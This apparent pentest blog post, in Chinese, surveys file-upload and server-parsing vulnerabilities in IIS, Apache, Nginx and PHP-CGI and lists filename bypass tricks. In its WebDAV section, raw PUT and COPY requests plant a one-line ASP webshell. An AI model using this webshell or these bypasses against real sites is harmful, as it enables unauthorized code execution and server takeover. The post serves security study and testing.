---
draft: false
date: 2016-07-20 11:30:53
title: 文件上传漏洞与文件解析漏洞
description: 
categories:
  - Pentest
tags:
  - 文件上传
---

### 0x00 文件上传漏洞
```bash
当文件上传时，若服务端脚本语言未对上传的文件进行严格验证和过滤，若恶意用户上传恶意的
脚本文件时，就有可能控制整个网站甚至是服务器，这就是文件上传漏洞。

# 上传后得到的权限
1. 后台权限：登陆了后台，可以进行一些操作、配置
2. 网站权限：获得了webshell，可以进行查看源代码等操作
3. 服务器权限：可以对服务器进行任意操作
```

### 0x01 文件上传漏洞分类
```
1. 配置不当可直接上传shell
    HTTP的PUT方法开启了
2. 文件解析漏洞导致文件执行
    Web容器解析漏洞
3. 本地文件上传限制被绕过
    BurpSuite抓包修改即可绕过
4. 服务端过滤不严或被绕过
    使用了黑名单过滤
5. 文件路径截断上传
    00截断等
6. 开源编辑器上传漏洞
    如CKEditor(FCKeditor的新版)、eWebEditor的漏洞
```

### 0x02 文件上传漏洞利用条件
```
1. 首先,上传的文件能够被web容器解释执行。所以文件上传后的目录要是web容器所覆盖到的路径
2. 其次,用户能从web访问这个文件
3. 最后,用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容,则可能导致攻击失败
```

### 0x03 文件上传漏洞挖掘
```
1. 查找上传点，如图片、附件、头像的上传等
2. 找类似upload的目录、类似upload.php的文件
3. 找编辑器目录，如eWebEdirot、fckeditor、kingeditor等
```

### 0x04 常见可执行文件后缀
```
可用于绕过：
php php2 php3 php5 phtml
asp aspx ascx ashx cer asa
jsp jspx jspf
```

### 0x05 解析漏洞
```
文件上传漏洞通常与Web容器的解析漏洞配合利用
常见Web容器有IIS、Nginx、Apache、Tomcat等
```

### 0x06 IIS解析漏洞
IIS6.0在解析文件时存在以下两个解析漏洞
```
1、当建立*.asp、*.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。
2、当文件名为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。
```
WebDav漏洞
```
    WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若
支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。

测试步骤如下：
    1）通过OPTIONS探测服务器所支持的HTTP方法
    请求：
    OPTIONS / HTTP/1.1
    Host: www.xxxx.com
    2)通过PUT方法向服务器上传shell
    请求：
    PUT /a.txt HTTP/1.1
    Host: www.xxxx.com
    Content-Length: 30

    <%eval request("chopper") %>
    3)通过Move或Copy方法改名
    请求：
    COPY /a.txt HTTP/1.1
    Host: www.xxxx.com
    Destination: http://www.xxxx.com/cmd.asp
    4)用DELETE方法删除文件
    请求：
    DELETE /a.txt HTTP/1.1
    Host: www.xxxx.com

注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞
```

### 0x07 Apache解析漏洞
```
在Apache 1.x和Apache 2.x中存在解析漏洞。

Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析，
直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。
如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制

Apache版本在2.4.0到2.4.29存在CVE-2017-15715解析漏洞，可利用换行来绕过上传，问题出在$上，
上传的文件名为php1，抓包改hex，将1改为0a这个换行即可绕过
<FilesMatch \.php$>
        SetHandler application/x-httpd-php
</FilesMatch>

可以在Apache安装目录下的文件"/conf/mime.types"中配置Apache可以识别的文件名
```

### 0x08 Nginx解析漏洞
```
对低版本的Nginx可以在任意文件名后添加%00.php进行解析攻击
如：上传图片xx.jpg，然后通过改名为xx.jpg%00.php就会解析为php
注：低版本 0.5全版本，0.6全版本，0.7<=0.7.65，0.8<=0.8.37
```

### 0x09 PHP CGI解析漏洞
```
当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问http://www.xxx.com/x.txt/x.php
时，若x.php不存在，则PHP会递归向前解析，将x.txt当作php脚本来解析

IIS7.0/7.5中：任意文件名/任意文件名.php就会被解析为php
Nginx中：任意文件名/任意文件名.php就会被解析为php，如a.log/1.php会被解析为a.php
```
